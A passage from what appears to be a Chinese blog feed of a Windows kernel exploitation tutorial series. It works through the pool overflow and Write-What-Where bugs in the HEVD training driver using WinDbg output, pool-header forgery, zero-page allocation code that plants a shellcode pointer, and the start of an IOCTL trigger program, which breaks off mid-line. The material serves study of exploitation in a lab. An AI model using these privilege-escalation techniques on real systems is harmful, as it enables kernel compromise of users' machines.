<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">****** HACKSYS_EVD_IOCTL_POOL_OVERFLOW ******</span><br><span class="line">[+] Allocating Pool chunk</span><br><span class="line">[+] Pool Tag: &apos;kcaH&apos;</span><br><span class="line">[+] Pool Type: NonPagedPool</span><br><span class="line">[+] Pool Size: 0x1F8</span><br><span class="line">[+] Pool Chunk: 0x8675AB88</span><br><span class="line">[+] UserBuffer: 0x0017F808</span><br><span class="line">[+] UserBuffer Size: 0x1F8</span><br><span class="line">[+] KernelBuffer: 0x8675AB88</span><br><span class="line">[+] KernelBuffer Size: 0x1F8</span><br><span class="line">[+] Triggering Pool Overflow</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">HEVD!TriggerPoolOverflow+0xe1:</span><br><span class="line">8d6a320b e8cacfffff      call    HEVD!memcpy (8d6a01da)</span><br><span class="line">1: kd&gt; !pool 0x8675AB88</span><br><span class="line">unable to get nt!ExpHeapBackedPoolEnabledState</span><br><span class="line">Pool page 8675ab88 region is Nonpaged pool</span><br><span class="line"> 8675a000 size:   40 previous size:    0  (Free)       Even</span><br><span class="line"> 8675a040 size:   40 previous size:   40  (Free )  Even (Protected)</span><br><span class="line"> 8675a080 size:   40 previous size:   40  (Free )  Even (Protected)</span><br><span class="line"> 8675a0c0 size:   40 previous size:   40  (Free )  Even (Protected)</span><br><span class="line"> 8675a100 size:   40 previous size:   40  (Free )  Even (Protected)</span><br><span class="line"> 8675a140 size:   40 previous size:   40  (Free )  Even (Protected)</span><br><span class="line"> 8675a180 size:   40 previous size:   40  (Free )  Even (Protected)</span><br><span class="line"> 8675a1c0 size:   40 previous size:   40  (Free )  Even (Protected)</span><br><span class="line"> 8675a200 size:   40 previous size:   40  (Free )  Even (Protected)</span><br><span class="line"> 8675a240 size:   40 previous size:   40  (Allocated)  Even (Protected)</span><br><span class="line"> 8675a280 size:   40 previous size:   40  (Free )  Even (Protected)</span><br><span class="line"> 8675a2c0 size:   40 previous size:   40  (Free )  Even (Protected)</span><br><span class="line"> 8675a300 size:   40 previous size:   40  (Free )  Even (Protected)</span><br><span class="line"> 8675a340 size:   40 previous size:   40  (Free )  Even (Protected)</span><br><span class="line"> 8675a380 size:   40 previous size:   40  (Free )  Even (Protected)</span><br><span class="line"> 8675a3c0 size:   40 previous size:   40  (Free )  Even (Protected)</span><br><span class="line"> 8675a400 size:   40 previous size:   40  (Free )  Even (Protected)</span><br><span class="line"> 8675a440 size:   40 previous size:   40  (Free)       Even</span><br><span class="line"> 8675a480 size:   40 previous size:   40  (Allocated)  Even (Protected)</span><br><span class="line"> 8675a4c0 size:  200 previous size:   40  (Free)       Even</span><br><span class="line"> 8675a6c0 size:   40 previous size:  200  (Allocated)  Even (Protected)</span><br><span class="line"> 8675a700 size:  200 previous size:   40  (Free)       Even</span><br><span class="line"> 8675a900 size:   40 previous size:  200  (Allocated)  Even (Protected)</span><br><span class="line"> 8675a940 size:  200 previous size:   40  (Free)       Even</span><br><span class="line"> 8675ab40 size:   40 previous size:  200  (Allocated)  Even (Protected)</span><br><span class="line">*8675ab80 size:  200 previous size:   40  (Allocated) *Hack</span><br><span class="line">		Owning component : Unknown (update pooltag.txt)</span><br><span class="line"> 8675ad80 size:   40 previous size:  200  (Allocated)  Even (Protected)</span><br><span class="line"> 8675adc0 size:  200 previous size:   40  (Free)       Even</span><br><span class="line"> 8675afc0 size:   40 previous size:  200  (Allocated)  Even (Protected)</span><br></pre></td></tr></table></figure>
<h2 id="池头伪造"><a href="#池头伪造" class="headerlink" title="池头伪造"></a>池头伪造</h2><p>首先我们复习一下<code>x86 Kernel Pool</code>的池头结构<code>_POOL_HEADER</code>，<code>_POOL_HEADER</code>是用来管理pool thunk的，里面存放一些释放和分配所需要的信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0: kd&gt; dt nt!_POOL_HEADER</span><br><span class="line">   +0x000 PreviousSize     : Pos 0, 9 Bits</span><br><span class="line">   +0x000 PoolIndex        : Pos 9, 7 Bits</span><br><span class="line">   +0x002 BlockSize        : Pos 0, 9 Bits</span><br><span class="line">   +0x002 PoolType         : Pos 9, 7 Bits</span><br><span class="line">   +0x000 Ulong1           : Uint4B</span><br><span class="line">   +0x004 PoolTag          : Uint4B</span><br><span class="line">   +0x004 AllocatorBackTraceIndex : Uint2B</span><br><span class="line">   +0x006 PoolTagHash      : Uint2B</span><br></pre></td></tr></table></figure>
<ul>
<li>PreviousSize: 前一个chunk的BlockSize。</li>
<li>PoolIndex : 所在大pool的pool descriptor的index。这是用来检查释放pool的算法是否释放正确了。</li>
<li>PoolType: Free=0,Allocated=(PoolType|2)</li>
<li>PoolTag: 4个可打印字符，标明由哪段代码负责。(4 printable characters identifying the code responsible for the allocation)</li>
</ul>
<p>我们在调试中查看下一个池的一些结构</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">[+] Pool Chunk: 0x867C8CC8</span><br><span class="line">...</span><br><span class="line">2: kd&gt; !pool 0x867C8CC8</span><br><span class="line">...</span><br><span class="line">*867c8cc0 size:  200 previous size:   40  (Allocated) *Hack</span><br><span class="line">		Owning component : Unknown (update pooltag.txt)</span><br><span class="line"> 867c8ec0 size:   40 previous size:  200  (Allocated)  Even (Protected)</span><br><span class="line">...</span><br><span class="line">2: kd&gt; dd 867c8ec0</span><br><span class="line">867c8ec0  04080040 ee657645 00000000 00000040</span><br><span class="line">867c8ed0  00000000 00000000 00000001 00000001</span><br><span class="line">867c8ee0  00000000 0008000c 88801040 00000000</span><br><span class="line">867c8ef0  11040001 00000000 867c8ef8 867c8ef8</span><br><span class="line">867c8f00  00200008 ee657645 867bc008 867c8008</span><br><span class="line">867c8f10  00000000 00000000 00000000 00000000</span><br><span class="line">867c8f20  00000000 00080001 00000000 00000000</span><br><span class="line">867c8f30  74040001 00000000 867c8f38 867c8f38</span><br><span class="line">2: kd&gt; dt nt!_POOL_HEADER 867c8ec0</span><br><span class="line">   +0x000 PreviousSize     : 0y001000000 (0x40)</span><br><span class="line">   +0x000 PoolIndex        : 0y0000000 (0)</span><br><span class="line">   +0x002 BlockSize        : 0y000001000 (0x8)</span><br><span class="line">   +0x002 PoolType         : 0y0000010 (0x2)</span><br><span class="line">   +0x000 Ulong1           : 0x4080040</span><br><span class="line">   +0x004 PoolTag          : 0xee657645</span><br><span class="line">   +0x004 AllocatorBackTraceIndex : 0x7645</span><br><span class="line">   +0x006 PoolTagHash      : 0xee65</span><br><span class="line">2: kd&gt; dt nt!_OBJECT_HEADER_QUOTA_INFO 867c8ec0+8</span><br><span class="line">   +0x000 PagedPoolCharge  : 0</span><br><span class="line">   +0x004 NonPagedPoolCharge : 0x40</span><br><span class="line">   +0x008 SecurityDescriptorCharge : 0</span><br><span class="line">   +0x00c SecurityDescriptorQuotaBlock : (null) </span><br><span class="line">2: kd&gt; dt nt!_OBJECT_HEADER 867c8ec0+18</span><br><span class="line">   +0x000 PointerCount     : 0n1</span><br><span class="line">   +0x004 HandleCount      : 0n1</span><br><span class="line">   +0x004 NextToFree       : 0x00000001 Void</span><br><span class="line">   +0x008 Lock             : _EX_PUSH_LOCK</span><br><span class="line">   +0x00c TypeIndex        : 0xc &apos;&apos;</span><br><span class="line">   +0x00d TraceFlags       : 0 &apos;&apos;</span><br><span class="line">   +0x00e InfoMask         : 0x8 &apos;&apos;</span><br><span class="line">   +0x00f Flags            : 0 &apos;&apos;</span><br><span class="line">   +0x010 ObjectCreateInfo : 0x88801040 _OBJECT_CREATE_INFORMATION</span><br><span class="line">   +0x010 QuotaBlockCharged : 0x88801040 Void</span><br><span class="line">   +0x014 SecurityDescriptor : (null) </span><br><span class="line">   +0x018 Body             : _QUAD</span><br></pre></td></tr></table></figure>
<p>你可能会疑惑<code>_OBJECT_HEADER</code>和<code>_OBJECT_HEADER_QUOTA_INFO</code>是怎么分析出来的，这里你需要了解 Windows 7 的对象结构不然可能听不懂图片下面的那几行字，最好是在NT4源码(private\ntos\inc\ob.h)中搜索查看这些结构，这里我放一张图片吧</p>
<p><img src="/2019/07/28/Windows-Kernel-Exploit-内核漏洞学习-4-PoolOverflow/1.png" alt="1"></p>
<p>这里我简单说一下如何识别这两个结构的，根据下一块池的大小是 0x40 ，在<code>_OBJECT_HEADER_QUOTA_INFO</code>结构中<code>NonPagedPoolCharge</code>的偏移为0x004刚好为池的大小，所以这里确定为<code>_OBJECT_HEADER_QUOTA_INFO</code>结构，又根据<code>InfoMask</code>字段在<code>_OBJECT_HEADER</code>中的偏移，结合我们确定的<code>_OBJECT_HEADER_QUOTA_INFO</code>结构掩码为0x8可以确定这里就是我们的<code>InfoMask</code>，这样推出<code>_OBJECT_HEADER</code>的位置在+0x18处，其实我们需要修改的也就是<code>_OBJECT_HEADER</code>中的<code>TypeIndex</code>字段，这里是0xc，我们需要将它修改为0，我们看一下<code>_OBJECT_HEADER</code>的结构</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3: kd&gt; dt _OBJECT_HEADER</span><br><span class="line">nt!_OBJECT_HEADER</span><br><span class="line">   +0x000 PointerCount     : Int4B</span><br><span class="line">   +0x004 HandleCount      : Int4B</span><br><span class="line">   +0x004 NextToFree       : Ptr32 Void</span><br><span class="line">   +0x008 Lock             : _EX_PUSH_LOCK</span><br><span class="line">   +0x00c TypeIndex        : UChar</span><br><span class="line">   +0x00d TraceFlags       : UChar</span><br><span class="line">   +0x00e InfoMask         : UChar</span><br><span class="line">   +0x00f Flags            : UChar</span><br><span class="line">   +0x010 ObjectCreateInfo : Ptr32 _OBJECT_CREATE_INFORMATION</span><br><span class="line">   +0x010 QuotaBlockCharged : Ptr32 Void</span><br><span class="line">   +0x014 SecurityDescriptor : Ptr32 Void</span><br><span class="line">   +0x018 Body             : _QUAD</span><br></pre></td></tr></table></figure>
<p>Windows 7 之后 <code>_OBJECT_HEADER</code> 及其之前的一些结构发生了变化，Windows 7之前0×008处的指向<code>_OBJECT_TYPE</code>的指针已经没有了,  取而代之的是在 0x00c 处的类型索引值。但Windows7中添加了一个函数<code>ObGetObjectType</code>，返回<code>Object_type</code>对象指针，也就是说根据索引值在<code>ObTypeIndexTable</code>数组中找到对应的<code>ObjectType</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3: kd&gt; u ObGetObjectType</span><br><span class="line">nt!ObGetObjectType:</span><br><span class="line">8405a7bd 8bff            mov     edi,edi</span><br><span class="line">8405a7bf 55              push    ebp</span><br><span class="line">8405a7c0 8bec            mov     ebp,esp</span><br><span class="line">8405a7c2 8b4508          mov     eax,dword ptr [ebp+8]</span><br><span class="line">8405a7c5 0fb640f4        movzx   eax,byte ptr [eax-0Ch]</span><br><span class="line">8405a7c9 8b04850059f483  mov     eax,dword ptr nt!ObTypeIndexTable (83f45900)[eax*4]</span><br><span class="line">8405a7d0 5d              pop     ebp</span><br><span class="line">8405a7d1 c20400          ret     4</span><br></pre></td></tr></table></figure>
<p>我们查看一下<code>ObTypeIndexTable</code>数组，根据<code>TypeIndex</code>的大小我们可以确定偏移 0xc 处的 0x865f0598 即是我们 Event 对象的<code>OBJECT_TYPE</code>，我们这里主要关注的是<code>TypeInfo</code>中的<code>CloseProcedure</code>字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1: kd&gt; dd nt!ObTypeIndexTable</span><br><span class="line">83f45900  00000000 bad0b0b0 86544768 865446a0</span><br><span class="line">83f45910  865445d8 865cd040 865cdf00 865cde38</span><br><span class="line">83f45920  865cdd70 865cdca8 865cdbe0 865cd528</span><br><span class="line">83f45930  865f0598 865f2418 865f2350 865f44c8</span><br><span class="line">83f45940  865f4400 865f4338 865f0040 865f0230</span><br><span class="line">83f45950  865f0168 865f19b8 865f18f0 865f1828</span><br><span class="line">83f45960  865f1760 865f1698 865f15d0 865f1508</span><br><span class="line">83f45970  865f1440 865ef6f0 865ef628 865ef560</span><br><span class="line">1: kd&gt; dt nt!_OBJECT_TYPE 865f0598</span><br><span class="line">   +0x000 TypeList         : _LIST_ENTRY [ 0x865f0598 - 0x865f0598 ]</span><br><span class="line">   +0x008 Name             : _UNICODE_STRING &quot;Event&quot;</span><br><span class="line">   +0x010 DefaultObject    : (null) </span><br><span class="line">   +0x014 Index            : 0xc &apos;&apos;</span><br><span class="line">   +0x018 TotalNumberOfObjects : 0x1050</span><br><span class="line">   +0x01c TotalNumberOfHandles : 0x10ac</span><br><span class="line">   +0x020 HighWaterNumberOfObjects : 0x1e8a</span><br><span class="line">   +0x024 HighWaterNumberOfHandles : 0x1ee6</span><br><span class="line">   +0x028 TypeInfo         : _OBJECT_TYPE_INITIALIZER</span><br><span class="line">   +0x078 TypeLock         : _EX_PUSH_LOCK</span><br><span class="line">   +0x07c Key              : 0x6e657645</span><br><span class="line">   +0x080 CallbackList     : _LIST_ENTRY [ 0x865f0618 - 0x865f0618 ]</span><br><span class="line">1: kd&gt; dx -id 0,0,ffffffff889681e0 -r1 (*((ntkrpamp!_OBJECT_TYPE_INITIALIZER *)0xffffffff865f05c0))</span><br><span class="line">(*((ntkrpamp!_OBJECT_TYPE_INITIALIZER *)0xffffffff865f05c0))                 [Type: _OBJECT_TYPE_INITIALIZER]</span><br><span class="line">    [+0x000] Length           : 0x50 [Type: unsigned short]</span><br><span class="line">    [+0x002] ObjectTypeFlags  : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x002 ( 0: 0)] CaseInsensitive  : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x002 ( 1: 1)] UnnamedObjectsOnly : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x002 ( 2: 2)] UseDefaultObject : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x002 ( 3: 3)] SecurityRequired : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x002 ( 4: 4)] MaintainHandleCount : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x002 ( 5: 5)] MaintainTypeList : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x002 ( 6: 6)] SupportsObjectCallbacks : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x004] ObjectTypeCode   : 0x2 [Type: unsigned long]</span><br><span class="line">    [+0x008] InvalidAttributes : 0x100 [Type: unsigned long]</span><br><span class="line">    [+0x00c] GenericMapping   [Type: _GENERIC_MAPPING]</span><br><span class="line">    [+0x01c] ValidAccessMask  : 0x1f0003 [Type: unsigned long]</span><br><span class="line">    [+0x020] RetainAccess     : 0x0 [Type: unsigned long]</span><br><span class="line">    [+0x024] PoolType         : NonPagedPool (0) [Type: _POOL_TYPE]</span><br><span class="line">    [+0x028] DefaultPagedPoolCharge : 0x0 [Type: unsigned long]</span><br><span class="line">    [+0x02c] DefaultNonPagedPoolCharge : 0x40 [Type: unsigned long]</span><br><span class="line">    [+0x030] DumpProcedure    : 0x0 [Type: void (*)(void *,_OBJECT_DUMP_CONTROL *)]</span><br><span class="line">    [+0x034] OpenProcedure    : 0x0 [Type: long (*)(_OB_OPEN_REASON,char,_EPROCESS *,void *,unsigned long *,unsigned long)]</span><br><span class="line">    [+0x038] CloseProcedure   : 0x0 [Type: void (*)(_EPROCESS *,void *,unsigned long,unsigned long)]</span><br><span class="line">    [+0x03c] DeleteProcedure  : 0x0 [Type: void (*)(void *)]</span><br><span class="line">    [+0x040] ParseProcedure   : 0x0 [Type: long (*)(void *,void *,_ACCESS_STATE *,char,unsigned long,_UNICODE_STRING *,_UNICODE_STRING *,void *,_SECURITY_QUALITY_OF_SERVICE *,void * *)]</span><br><span class="line">    [+0x044] SecurityProcedure : 0x840675b6 [Type: long (*)(void *,_SECURITY_OPERATION_CODE,unsigned long *,void *,unsigned long *,void * *,_POOL_TYPE,_GENERIC_MAPPING *,char)]</span><br><span class="line">    [+0x048] QueryNameProcedure : 0x0 [Type: long (*)(void *,unsigned char,_OBJECT_NAME_INFORMATION *,unsigned long,unsigned long *,char)]</span><br><span class="line">    [+0x04c] OkayToCloseProcedure : 0x0 [Type: unsigned char (*)(_EPROCESS *,void *,void *,char)]</span><br></pre></td></tr></table></figure>
<p>我们的最后目的是把<code>CloseProcedure</code>字段覆盖为指向shellcode的指针，因为在最后会调用这些函数，把这里覆盖自然也就可以执行我们的shellcode，我们希望这里能够将Event这个结构放在我们能够操控的位置，在 Windows 7 中我们知道是可以在用户模式下控制0页内存的，所以我们希望这里能够指到0页内存，所以我们想把<code>TypeIndex</code>从0xc修改为0x0，在 Windows 7 下<code>ObTypeIndexTable</code>的前八个字节始终为0，所以可以在这里进行构造，需要注意的是，这里我们需要申请0页内存，我们传入的第二个参数不能是0，如果是0系统就会随机给我们分配一块内存，我们希望的是分配0页，如果传入1的话由于内存对齐就可以申请到0页内存，然后就可以放入我们shellcode的位置了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">PVOID	Zero_addr = (PVOID)<span class="number">1</span>;</span><br><span class="line">SIZE_T	RegionSize = <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">*(FARPROC*)&amp; NtAllocateVirtualMemory = GetProcAddress(</span><br><span class="line">	GetModuleHandleW(<span class="string">L"ntdll"</span>),</span><br><span class="line">	<span class="string">"NtAllocateVirtualMemory"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (NtAllocateVirtualMemory == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]Failed to get function NtAllocateVirtualMemory!!!\n"</span>);</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]Started to alloc zero page...\n"</span>);</span><br><span class="line"><span class="keyword">if</span> (!NT_SUCCESS(NtAllocateVirtualMemory(</span><br><span class="line">	INVALID_HANDLE_VALUE,</span><br><span class="line">	&amp;Zero_addr,</span><br><span class="line">	<span class="number">0</span>,</span><br><span class="line">	&amp;RegionSize,</span><br><span class="line">	MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">	PAGE_READWRITE)) || Zero_addr != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]Failed to alloc zero page!\n"</span>);</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]Success to alloc zero page...\n"</span>);</span><br><span class="line">*(DWORD*)(<span class="number">0x60</span>) = (DWORD)&amp; ShellCode;</span><br></pre></td></tr></table></figure>
<p>最后我们整合一下代码就可以提权了，总结一下步骤</p>
<ul>
<li>初始化句柄等结构</li>
<li>构造池头结构</li>
<li>申请0页内存并放入shellcode位置</li>
<li>堆喷射构造间隙</li>
<li>调用<code>TriggerPoolOverflow</code>函数</li>
<li>关闭句柄</li>
<li>调用cmd提权</li>
</ul>
<p>最后提权效果如下，详细代码参考<a href="https://github.com/ThunderJie/Windows-Kernel-Exploit/blob/master/HEVD/PoolOverflow/PoolOverflow/PoolOverflow.c" target="_blank" rel="noopener">这里</a></p>
<p><img src="/2019/07/28/Windows-Kernel-Exploit-内核漏洞学习-4-PoolOverflow/test.gif" alt="test"></p>
<h1 id="0x03：后记"><a href="#0x03：后记" class="headerlink" title="0x03：后记"></a>0x03：后记</h1><p>这里放一些调试的小技巧，以判断每一步是否正确，在<code>memcpy</code>处下断点，p单步运行可观察下一个池是否构造完成，<code>dd 0x0</code>观察0页内存查看0x60处的指针是否指向shellcode，在该处下断点运行可以观察到是否运行了我们的shellcode，源码中的调试就是用<code>__debugbreak()</code>下断点观察即可</p>
]]></content>
      <categories>
        <category>Windows Kernel</category>
      </categories>
      <tags>
        <tag>Windows Kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows-Kernel-Exploit-内核漏洞学习(3)-Write-What-Where</title>
    <url>/2019/07/28/Windows-Kernel-Exploit-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-3-Write-What-Where/</url>
    <content><![CDATA[<h1 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h1><p>这是 Windows kernel exploit 系列的第三部分，前一篇我们讲了内核栈溢出的利用，这一篇我们介绍任意内存覆盖漏洞，也就是 Write-What-Where 漏洞，和前面一样，看此文章之前你需要有以下准备：</p>
<ul>
<li>Windows 7 x86 sp1虚拟机</li>
<li>配置好windbg等调试工具，建议配合VirtualKD使用</li>
<li>HEVD+OSR Loader配合构造漏洞环境</li>
</ul>
<h1 id="0x01：漏洞原理"><a href="#0x01：漏洞原理" class="headerlink" title="0x01：漏洞原理"></a>0x01：漏洞原理</h1><h2 id="任意内存覆盖漏洞"><a href="#任意内存覆盖漏洞" class="headerlink" title="任意内存覆盖漏洞"></a>任意内存覆盖漏洞</h2><p>从 IDA 中我们直接分析<code>HEVD.sys</code>中的<code>TriggerArbitraryOverwrite</code>函数，乍一看没啥毛病，仔细分析发现v1，v2这俩指针都没有验证地址是否有效就直接拿来用了，这是内核态，给点面子好吧，胡乱引用可以要蓝屏的(严肃</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">TriggerArbitraryOverwrite</span><span class="params">(_WRITE_WHAT_WHERE *UserWriteWhatWhere)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *v1; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *v2; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  ProbeForRead(UserWriteWhatWhere, <span class="number">8u</span>, <span class="number">4u</span>);</span><br><span class="line">  v1 = UserWriteWhatWhere-&gt;What;</span><br><span class="line">  v2 = UserWriteWhatWhere-&gt;Where;</span><br><span class="line">  DbgPrint(<span class="string">"[+] UserWriteWhatWhere: 0x%p\n"</span>, UserWriteWhatWhere);</span><br><span class="line">  DbgPrint(<span class="string">"[+] WRITE_WHAT_WHERE Size: 0x%X\n"</span>, <span class="number">8</span>);</span><br><span class="line">  DbgPrint(<span class="string">"[+] UserWriteWhatWhere-&gt;What: 0x%p\n"</span>, v1);</span><br><span class="line">  DbgPrint(<span class="string">"[+] UserWriteWhatWhere-&gt;Where: 0x%p\n"</span>, v2);</span><br><span class="line">  DbgPrint(<span class="string">"[+] Triggering Arbitrary Overwrite\n"</span>);</span><br><span class="line">  *v2 = *v1;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们从<code>ArbitraryOverwrite.c</code>源码文件入手，直接定位关键点</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SECURE</span></span><br><span class="line">        <span class="comment">// Secure Note: This is secure because the developer is properly validating if address</span></span><br><span class="line">        <span class="comment">// pointed by 'Where' and 'What' value resides in User mode by calling ProbeForRead()</span></span><br><span class="line">        <span class="comment">// routine before performing the write operation</span></span><br><span class="line">        ProbeForRead((PVOID)Where, <span class="keyword">sizeof</span>(PULONG_PTR), (ULONG)__alignof(PULONG_PTR));</span><br><span class="line">        ProbeForRead((PVOID)What, <span class="keyword">sizeof</span>(PULONG_PTR), (ULONG)__alignof(PULONG_PTR));</span><br><span class="line"></span><br><span class="line">        *(Where) = *(What);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">        DbgPrint(<span class="string">"[+] Triggering Arbitrary Overwrite\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Vulnerability Note: This is a vanilla Arbitrary Memory Overwrite vulnerability</span></span><br><span class="line">        <span class="comment">// because the developer is writing the value pointed by 'What' to memory location</span></span><br><span class="line">        <span class="comment">// pointed by 'Where' without properly validating if the values pointed by 'Where'</span></span><br><span class="line">        <span class="comment">// and 'What' resides in User mode</span></span><br><span class="line">        *(Where) = *(What);</span><br></pre></td></tr></table></figure>
<p>如果你不清楚<code>ProbeForRead</code>函数的话，<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-probeforread" target="_blank" rel="noopener">这里</a>可以得到很官方的解释(永远记住官方文档是最好的)，就是检查用户模式缓冲区是否实际驻留在地址空间的用户部分中，并且正确对齐，相当于检查一块内存是否正确。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ProbeForRead</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">const</span> <span class="keyword">volatile</span> VOID *Address,</span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T              Length,</span></span></span><br><span class="line"><span class="function"><span class="params">  ULONG               Alignment</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>和我们设想的一样，从刚才上面的对比处可以很清楚的看出，在安全的条件下，我们在使用两个指针的时候对指针所指向的地址进行了验证，如果不对地址进行验证，在内核空间中访问到了不该访问的内存那很可能就会蓝屏，通过这一点我们就可以利用，既然是访问内存，那我们让其访问我们shellcode的位置即可达到提权的效果，那么怎么才能访问到我们的shellcode呢？</p>
<h1 id="0x02：漏洞利用"><a href="#0x02：漏洞利用" class="headerlink" title="0x02：漏洞利用"></a>0x02：漏洞利用</h1><h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><h3 id="控制码"><a href="#控制码" class="headerlink" title="控制码"></a>控制码</h3><p>知道了漏洞的原理之后我们开始构造exploit，前面我们通过分析<code>IrpDeviceIoCtlHandler</code>函数可以逆向出每个函数对应的控制码，然而这个过程我们可以通过分析<code>HackSysExtremeVulnerableDriver.h</code>自己计算出控制码，源码中的定义如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)</span></span><br></pre></td></tr></table></figure>
<p>下面解释一下如何计算控制码，<code>CTL_CODE</code>这个宏负责创建一个独特的系统I/O（输入输出）控制代码(IOCTL)，计算公式如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> xxx_xxx_xxx CTL_CODE(DeviceType, Function, Method, Access)</span></span><br><span class="line"></span><br><span class="line">( ((DeviceType) &lt;&lt; <span class="number">16</span>) | ((Access) &lt;&lt; <span class="number">14</span>) | ((Function) &lt;&lt; <span class="number">2</span>) | (Method))</span><br></pre></td></tr></table></figure>
<p>通过python我们就可以计算出控制码(注意对应好位置)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex((<span class="number">0x00000022</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">0x00000000</span> &lt;&lt; <span class="number">14</span>) | (<span class="number">0x802</span> &lt;&lt; <span class="number">2</span>) | <span class="number">0x00000003</span>)</span><br><span class="line"><span class="string">'0x22200b'</span></span><br></pre></td></tr></table></figure>
<p>因为<code>WRITE_WHAT_WHERE</code>结构如下，一共有8个字节，前四个是 what ，后四个是 where ，所以我们申请一个buf大小为8个字节传入即可用到 what 和 where 指针</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">WRITE_WHAT_WHERE</span> &#123;</span></span><br><span class="line">        PULONG_PTR What;</span><br><span class="line">        PULONG_PTR Where;</span><br><span class="line">    &#125; WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;</span><br></pre></td></tr></table></figure>
<p>下面我们来测试一下我们的猜测是否正确</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">	DWORD recvBuf;</span><br><span class="line">	<span class="comment">// 获取句柄</span></span><br><span class="line">	HANDLE hDevice = CreateFileA(<span class="string">"\\\\.\\HackSysExtremeVulnerableDriver"</span>,</span><br><span class="line">		GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		OPEN_EXISTING,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Start to get HANDLE...\n"</span>);</span><br><span class="line">	<span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE || hDevice == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Failed to get HANDLE!!!\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(buf, <span class="string">'A'</span>, <span class="number">8</span>);</span><br><span class="line">	DeviceIoControl(hDevice, <span 